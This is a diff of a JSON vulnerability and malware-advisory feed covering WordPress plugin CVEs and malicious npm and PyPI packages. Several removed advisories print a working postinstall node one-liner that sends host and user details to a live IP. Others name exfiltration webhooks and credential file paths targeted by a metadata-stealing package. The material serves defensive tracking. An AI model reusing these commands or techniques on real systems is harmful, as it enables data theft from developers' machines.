-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-qvhq-m873-hq8g"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/e42d117776998fa48d6eb4956bfaba9e434b902b/osv/malicious/npm/service-roles-registry/MAL-2026-18519.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/service-roles-registry/v/99.0.2"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-11-03T10:04:41Z",
-      "source_updated_at": "2026-11-03T09:31:54Z",
       "source_type": "github",
       "known_exploited": false
     },
@@ -156562,7 +157855,7 @@
       "published": "2026-11-02",
       "updated": "2026-11-04",
       "summary": "Malicious package. `wallet-tracking` is a PyPI cryptocurrency-wallet information stealer. It collects wallet data on the victim host and exfiltrates it to an attacker-controlled Discord webhook. The source also still contains an unconfigured placeholder webhook URL (.../api/webhooks/YOUR_URL) beside the live one, indicating a copy-paste stealer template. Classification: information stealer. The package provides no legitimate functionality, so all published versions are malicious. First observed by wormsign on 2026-05-30. Full indicators are published at the reference below. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/f63470f52b3707cb0ecb4ced35a983237466e281/osv/malicious/pypi/wallet-tracking/MAL-2026-18443.json))",
-      "affected": "pip: wallet-tracking (> 0); pip: wallet-tracking (= 1.0.0); pip: wallet-tracking (= 1.0.1); pip: wallet-tracking (= 1.0.3); pip: wallet-tracking (= 1.0.4); pip: wallet-tracking (= 1.0.5); pip: wallet-tracking (= 1.0.6)",
+      "affected": "pip: wallet-tracking (> 0); pip: wallet-tracking (= 1.0.0); pip: wallet-tracking (= 1.0.1); pip: wallet-tracking (= 1.0.3); pip: wallet-tracking (= 1.0.4); pip: wallet-tracking (= 1.0.5); pip: wallet-tracking (= 1.0.6); pip: wallet-tracking (>= 1.0.3)",
       "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
       "action": "Match the affected package and version to your deployment before prioritizing remediation.",
       "sources": [
@@ -156588,7 +157881,49 @@
       "cvss": null,
       "status": "GitHub malware advisory",
       "first_seen_at": "2026-11-02T08:30:42Z",
-      "source_updated_at": "2026-11-04T00:32:09Z",
+      "source_updated_at": "2026-11-04T06:33:59Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-4h5p-w547-9qmv",
+      "title": "Malicious code in @ifasn/mmdd-doc-mcp (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Application dependencies",
+        "Docker / Kubernetes",
+        "Node.js / npm"
+      ],
+      "published": "2026-11-02",
+      "updated": "2026-11-04",
+      "summary": "## Source: amazon-inspector (2999c5d0dd2a35fe1dfb6bdc17da36aaed07d4f6fa7e10f9f395a4b39d1c7265) @ifasn/mmdd-doc-mcp advertises itself as a Markdown TOC/stats/table MCP server, but on startup (bin entry / `npm start`) its index.js performs an unsolicited IMDSv2 handshake against the Alibaba Cloud ECS metadata endpoint 100.100.100.200: a PUT to /latest/api/token with X-aliyun-ecs-metadata-token-ttl-seconds followed by a GET to /latest/meta-data/ram/security-credentials/, retrieving the host instance's RAM temporary security credentials and other metadata. The response is written to output/meta_v2_dump.txt in the current working directory. The behavior is unrelated to any Markdown processing. The published tarball also ships patch scripts (patch111.js, patch112.js) that enumerate additional host secret paths — /etc/shadow, /etc/passwd, /root/.ssh/id_rsa, /var/www/html/.env, and the Kubernetes service-account token at /var/run/secrets/kubernetes.io/serviceaccount/token — with preview labels SENSITIVE-FILE / SHADOW-ENTRIES / TOKEN-LENGTH, and output/meta_field_dump.txt confirms those host-path probes were previously executed. A code comment claiming '无网络上报' (no network reporting) and the 'v2 probe edition' framing are cover-story labels; the operation is unauthorized reading of install",
+      "affected": "npm: @ifasn/mmdd-doc-mcp (= 1.1.1); npm: @ifasn/mmdd-doc-mcp (= 1.0.6); npm: @ifasn/mmdd-doc-mcp (= 1.0.3); npm: @ifasn/mmdd-doc-mcp (= 1.0.4); npm: @ifasn/mmdd-doc-mcp (= 1.1.6); npm: @ifasn/mmdd-doc-mcp (= 1.0.4-2); npm: @ifasn/mmdd-doc-mcp (= 1.1.8); npm: @ifasn/mmdd-doc-mcp (= 2.0.1); npm: @ifasn/mmdd-doc-mcp (= 1.0.1); npm: @ifasn/mmdd-doc-mcp (= 1.0.5); npm: @ifasn/mmdd-doc-mcp (= 1.1.3); npm: @ifasn/mmdd-doc-mcp (= 1.1.7); npm: @ifasn/mmdd-doc-mcp (= 1.1.9-2); npm: @ifasn/mmdd-doc-mcp (= 2.0.4); npm: @ifasn/mmdd-doc-mcp (= 1.1.0); npm: @ifasn/mmdd-doc-mcp (= 1.1.2); npm: @ifasn/mmdd-doc-mcp (= 1.1.5); npm: @ifasn/mmdd-doc-mcp (= 2.1.1)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub malware advisory",
+          "url": "https://github.com/advisories/GHSA-4h5p-w547-9qmv"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/cdd9fc0c28c93bd1d9e884a6f8f56001207a6773/osv/malicious/npm/@ifasn/mmdd-doc-mcp/MAL-2026-18489.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/@ifasn/mmdd-doc-mcp/v/1.0.1"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/@ifasn/mmdd-doc-mcp/v/1.0.3"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-11-02T21:52:54Z",
+      "source_updated_at": "2026-11-04T06:33:59Z",
       "source_type": "github",
       "known_exploited": false
     },
@@ -160862,48 +162197,6 @@
       "epss": 0.00144,
       "epss_percentile": 0.03699,
       "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "GHSA-4h5p-w547-9qmv",
-      "title": "Malicious code in @ifasn/mmdd-doc-mcp (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Docker / Kubernetes",
-        "Node.js / npm"
-      ],
-      "published": "2026-11-02",
-      "updated": "2026-11-02",
-      "summary": "## Source: amazon-inspector (2999c5d0dd2a35fe1dfb6bdc17da36aaed07d4f6fa7e10f9f395a4b39d1c7265) @ifasn/mmdd-doc-mcp advertises itself as a Markdown TOC/stats/table MCP server, but on startup (bin entry / `npm start`) its index.js performs an unsolicited IMDSv2 handshake against the Alibaba Cloud ECS metadata endpoint 100.100.100.200: a PUT to /latest/api/token with X-aliyun-ecs-metadata-token-ttl-seconds followed by a GET to /latest/meta-data/ram/security-credentials/, retrieving the host instance's RAM temporary security credentials and other metadata. The response is written to output/meta_v2_dump.txt in the current working directory. The behavior is unrelated to any Markdown processing. The published tarball also ships patch scripts (patch111.js, patch112.js) that enumerate additional host secret paths — /etc/shadow, /etc/passwd, /root/.ssh/id_rsa, /var/www/html/.env, and the Kubernetes service-account token at /var/run/secrets/kubernetes.io/serviceaccount/token — with preview labels SENSITIVE-FILE / SHADOW-ENTRIES / TOKEN-LENGTH, and output/meta_field_dump.txt confirms those host-path probes were previously executed. A code comment claiming '无网络上报' (no network reporting) and the 'v2 probe edition' framing are cover-story labels; the operation is unauthorized reading of install",
-      "affected": "npm: @ifasn/mmdd-doc-mcp (= 1.1.1); npm: @ifasn/mmdd-doc-mcp (= 1.0.6); npm: @ifasn/mmdd-doc-mcp (= 1.0.3); npm: @ifasn/mmdd-doc-mcp (= 1.0.4); npm: @ifasn/mmdd-doc-mcp (= 1.1.6); npm: @ifasn/mmdd-doc-mcp (= 1.0.4-2); npm: @ifasn/mmdd-doc-mcp (= 1.1.8); npm: @ifasn/mmdd-doc-mcp (= 2.0.1); npm: @ifasn/mmdd-doc-mcp (= 1.0.1); npm: @ifasn/mmdd-doc-mcp (= 1.0.5); npm: @ifasn/mmdd-doc-mcp (= 1.1.3); npm: @ifasn/mmdd-doc-mcp (= 1.1.7); npm: @ifasn/mmdd-doc-mcp (= 1.1.9-2); npm: @ifasn/mmdd-doc-mcp (= 2.0.4); npm: @ifasn/mmdd-doc-mcp (= 1.1.0); npm: @ifasn/mmdd-doc-mcp (= 1.1.2); npm: @ifasn/mmdd-doc-mcp (= 1.1.5)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-4h5p-w547-9qmv"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cdd9fc0c28c93bd1d9e884a6f8f56001207a6773/osv/malicious/npm/@ifasn/mmdd-doc-mcp/MAL-2026-18489.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/@ifasn/mmdd-doc-mcp/v/1.0.1"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/@ifasn/mmdd-doc-mcp/v/1.0.3"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-11-02T21:52:54Z",
-      "source_updated_at": "2026-11-02T21:31:36Z",
-      "source_type": "github",
-      "known_exploited": false
     },
     {
       "id": "GHSA-f826-46h5-5rcq",
@@ -184792,1194 +186085,6 @@
       "epss_as_of": "2026-11-04"
     },
     {
-      "id": "CVE-2026-78395",
-      "title": "The Link Library WordPress plugin before 7.10.0 does not re-check the selected library's own login requirement when processing its front-end link submission, allowing unauthen",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Link Library WordPress plugin before 7.10.0 does not re-check the selected library's own login requirement when processing its front-end link submission, allowing unauthenticated users to submit links to a library configured to require login by reusing a form token obtained from another library that does not.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-78395"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.3",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T07:11:06Z",
-      "source_updated_at": "2026-10-29T15:18:27.920",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00182,
-      "epss_percentile": 0.07803,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-78396",
-      "title": "The Link Library WordPress plugin before 7.10.0 does not verify that a requested link belongs to the settings set whose display template is used to render it, allowing unauthe",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Link Library WordPress plugin before 7.10.0 does not verify that a requested link belongs to the settings set whose display template is used to render it, allowing unauthenticated users to disclose the telephone number, e-mail address and submitter name stored with links that the settings set is configured not to display.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-78396"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.3",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T07:11:06Z",
-      "source_updated_at": "2026-10-29T15:18:27.920",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00206,
-      "epss_percentile": 0.10706,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-85007",
-      "title": "The Video Player for YouTube WordPress plugin before 2.1.4 does not perform a capability check on its player-preset AJAX handler, allowing users with the Contributor role and ",
-      "severity": "low",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Video Player for YouTube WordPress plugin before 2.1.4 does not perform a capability check on its player-preset AJAX handler, allowing users with the Contributor role and above to read the site-wide player-preset configuration, and in versions before 2.1.1 to modify and delete it as well.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85007"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "3.8",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T07:11:06Z",
-      "source_updated_at": "2026-10-29T15:18:27.920",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00152,
-      "epss_percentile": 0.04415,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-86794",
-      "title": "The Community Events WordPress plugin before 1.6.0 does not have authorisation or nonce checks when processing public event submissions, and does not escape several of the sub",
-      "severity": "high",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Community Events WordPress plugin before 1.6.0 does not have authorisation or nonce checks when processing public event submissions, and does not escape several of the submitted values before outputting them in the administration dashboard and on the public calendar, allowing unauthenticated users to inject arbitrary web scripts that will execute in the browser of an administrator reviewing the submission.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86794"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "8.8",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T07:11:06Z",
-      "source_updated_at": "2026-10-29T15:18:27.920",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00276,
-      "epss_percentile": 0.20088,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-88928",
-      "title": "The PAYCOMET for WooCommerce WordPress plugin before 5.46 does not verify the cryptographic signature on its payment notification endpoint when the request references a tokeni",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The PAYCOMET for WooCommerce WordPress plugin before 5.46 does not verify the cryptographic signature on its payment notification endpoint when the request references a tokenisation operation, allowing unauthenticated attackers to overwrite the stored payment token associated with existing orders and delete saved card records.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-88928"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "6.5",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T07:11:06Z",
-      "source_updated_at": "2026-10-29T15:18:27.920",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00164,
-      "epss_percentile": 0.05688,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-89216",
-      "title": "The vTables WordPress plugin before 0.3 does not properly sanitise and escape a parameter before using it in a SQL statement, which allows unauthenticated attackers to perform",
-      "severity": "high",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The vTables WordPress plugin before 0.3 does not properly sanitise and escape a parameter before using it in a SQL statement, which allows unauthenticated attackers to perform SQL injection attacks and extract data from the database.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-89216"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "8.6",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T07:11:06Z",
-      "source_updated_at": "2026-10-29T15:18:27.920",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00274,
-      "epss_percentile": 0.19866,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-93293",
-      "title": "The Password Protected plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the bundled Freemius SDK's purchase-completion handler in all versions up to, and ",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Password Protected plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the bundled Freemius SDK's purchase-completion handler in all versions up to, and including, 2.8.4 due to insufficient input sanitization and output escaping. Once the site's Freemius opt-in is complete (the normal state after an administrator clicks \"Allow & Continue\"), the handler processes the 'purchased_plan' request parameter on any wp-admin request from an authenticated user without any capability, nonce, or purchase validation, and stores it in a persistent, site-wide administrative notice. This makes it possible for authenticated attackers, with subscriber-level access and above, to inject arbitrary web scripts that execute automatically when an administrator views a standard admin page such as their Profile page.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-93293"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "6.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T07:11:06Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00187,
-      "epss_percentile": 0.08373,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "GHSA-2hrq-h3vj-5wxm",
-      "title": "Malicious code in identity-two-factor (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "identity-two-factor@999.0.0 is a dependency-confusion package aimed at Coinbase (its README and postinstall.js say so, and the beacon path is `cbhq-canary`) with no functional code. Its postinstall script runs `node postinstall.js` on npm install, which writes a marker file to the temp directory and POSTs the hostname, username, working-directory name, CI flag and Node version to `https://webhook.site/e0981a8e-081e-49a0-8b4a-235109e13045/cbhq-canary`. It was published by the npm account hologrammmm0x, which has no other packages. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/3397e9bf09b996a6453a361d63d8e45b381642df/osv/malicious/npm/identity-two-factor/MAL-2026-18367.json))",
-      "affected": "npm: identity-two-factor (= 999.0.0)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-2hrq-h3vj-5wxm"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/3397e9bf09b996a6453a361d63d8e45b381642df/osv/malicious/npm/identity-two-factor/MAL-2026-18367.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/identity-two-factor"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cc8ee308c3a331b6848b53a312a11cd5dc39dd54/osv/malicious/npm/identity-two-factor/MAL-2026-18367.json"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:31:32Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "GHSA-48mf-mvf8-x4v3",
-      "title": "Malicious code in spectral-net-probe (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "spectral-net-probe has no functional code. Versions 1.0.1 and 1.0.4 have a postinstall script that runs `node index.js` on npm install, which sends an HTTPS GET to a Cloudflare quick tunnel (`https://nobody-johnston-with-enabling.trycloudflare.com/aa?x=1` and `https://imaging-amazing-trunk-surgeons.trycloudflare.com/marker104?v=1`). Version 1.0.10 runs when the package is loaded: it fetches `/api/modules/ECT-654321` from `http://154.57.164.64:30664` and `http://127.0.0.1:3000`, reads up to ten local files whose paths the reply lists in `data.cargo_hold`, and PUTs the first 400 characters of their contents to `/api/modules/ECT-987654` on both hosts. It was published by the npm account kristol07, which published two more packages the same day (phantom-chartwinds and phantom-powder-keg, placeholder versions only so far). --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/448eec7133f1e28e4401e41517a5a42064d4fdd2/osv/malicious/npm/spectral-net-probe/MAL-2026-18368.json))",
-      "affected": "npm: spectral-net-probe (= 1.0.1); npm: spectral-net-probe (= 1.0.4); npm: spectral-net-probe (= 1.0.10)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-48mf-mvf8-x4v3"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/448eec7133f1e28e4401e41517a5a42064d4fdd2/osv/malicious/npm/spectral-net-probe/MAL-2026-18368.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/spectral-net-probe"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cc8ee308c3a331b6848b53a312a11cd5dc39dd54/osv/malicious/npm/spectral-net-probe/MAL-2026-18368.json"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:31:34Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "GHSA-j7r7-x5hv-p975",
-      "title": "Malicious code in mw-test-utils (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "mw-test-utils was published to npm on 2026-10-27 from 06:56:36 UTC by the account amahrou1w, about one minute after npm's staged-publish placeholder 0.0.0-stage, in versions 1.0.0, 10.0.0, 10.0.1. The three packages mw-test-utils, mw-communication-client and mui-wrapper-x-date-pickers were published by the same account within eight minutes and are identical apart from the name. Each tarball has three files: index.js (module.exports = {}), README.md and package.json. The package has no repository, no functional code and no dependencies, and 1.0.0 is the latest version at the time of this report. package.json declares a preinstall and a postinstall script, which npm runs on every install: node -e \"require('http').get('http://38.242.235.206/depconf/mw-test-utils/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})\" The postinstall script is the same request with the path /postinstall. Each install therefore sends the user name, the host name and the working directory of the installing machine over plain HTTP to the IP address 38.242.235.206. The README and the package description call the package a dependency-confusion proof of concept for a bug bou",
-      "affected": "npm: mw-test-utils (= 1.0.0); npm: mw-test-utils (= 10.0.0); npm: mw-test-utils (= 10.0.1)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-j7r7-x5hv-p975"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/116e199a1fd3042c7e83e59c4d3ce70c68428d6d/osv/malicious/npm/mw-test-utils/MAL-2026-18371.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cc8ee308c3a331b6848b53a312a11cd5dc39dd54/osv/malicious/npm/mw-test-utils/MAL-2026-18371.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/mw-test-utils/v/1.0.0"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:31:33Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "GHSA-g2vv-m33m-p9qf",
-      "title": "Malicious code in @zmtcdn/ui (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "@zmtcdn/ui 9999.0.0 and 9999.0.7 are dependency-confusion packages with an empty `index.js` and a description of \"Security research PoC\". Their postinstall script runs `node postinstall.js` on npm install, which POSTs the hostname, username, platform, working directory and the names of all environment variables to `https://www.hinny.shop/api`. They were published by the npm account kill_shs, which also published @zmtcdn/components with the same script. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/ui/MAL-2026-18373.json))",
-      "affected": "npm: @zmtcdn/ui (= 9999.0.0); npm: @zmtcdn/ui (= 9999.0.7)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-g2vv-m33m-p9qf"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/ui/MAL-2026-18373.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/@zmtcdn/ui"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cc8ee308c3a331b6848b53a312a11cd5dc39dd54/osv/malicious/npm/@zmtcdn/ui/MAL-2026-18373.json"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:31:32Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "GHSA-98qv-v7qr-v3gx",
-      "title": "Malicious code in mui-wrapper-x-date-pickers (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "mui-wrapper-x-date-pickers was published to npm on 2026-10-27 from 06:55:20 UTC by the account amahrou1w, about one minute after npm's staged-publish placeholder 0.0.0-stage, in versions 1.0.0, 10.0.0. The three packages mw-test-utils, mw-communication-client and mui-wrapper-x-date-pickers were published by the same account within eight minutes and are identical apart from the name. Each tarball has three files: index.js (module.exports = {}), README.md and package.json. The package has no repository, no functional code and no dependencies, and 10.0.0 is the latest version at the time of this report. package.json declares a preinstall and a postinstall script, which npm runs on every install: node -e \"require('http').get('http://38.242.235.206/depconf/mui-wrapper-x-date-pickers/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})\" The postinstall script is the same request with the path /postinstall. Each install therefore sends the user name, the host name and the working directory of the installing machine over plain HTTP to the IP address 38.242.235.206. The README and the package description call the package a dependency-confusion proof of co",
-      "affected": "npm: mui-wrapper-x-date-pickers (= 1.0.0); npm: mui-wrapper-x-date-pickers (= 10.0.0)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-98qv-v7qr-v3gx"
-        },
-        {
-          "label": "Additional advisory",
